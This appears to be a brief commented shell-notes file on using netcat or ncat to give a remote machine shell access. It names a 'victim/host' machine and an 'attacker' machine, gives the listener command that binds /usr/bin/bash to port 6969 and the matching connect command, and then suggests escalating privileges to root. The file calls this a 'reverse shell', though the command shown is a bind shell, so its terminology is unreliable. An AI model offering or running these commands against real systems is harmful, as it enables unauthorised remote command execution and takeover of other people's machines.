


# You can use kali linux's nc command to spawn a reverse shell





# Create the vunlerability on the host computer with nc or ncat
# NOTE: the nc command on debian systems has been defanged of
# the -e and -c options so as to decrease sercurity vulnerability
# 'ncat' is a suitable substitute on a debian systems like debian10 or ubuntu



# COMMAND TO RUN ON THE VICTIM/HOST MACHINE
# -l specifies to listen
# -p specifies chosen port number
# -e specifies the command to run on the port
# stdin and stdout are given to remote machine through ncat
nc -l -p 6969 -e /usr/bin/bash



# COMMAND TO RUN ON THE REMOTE/ATTACKER MACHINE
nc <hostname_or_ip_address> <portnumber>



# After the connection is establish you can run commands in the remote terminal and
# see their output piped back to you. After this is achieve you want to think
# about how to escalate priveledges on the machine as as to gain root priveledge


# a tutorial of this can be found here
# https://www.youtube.com/watch?v=VF4In6rIPGc





















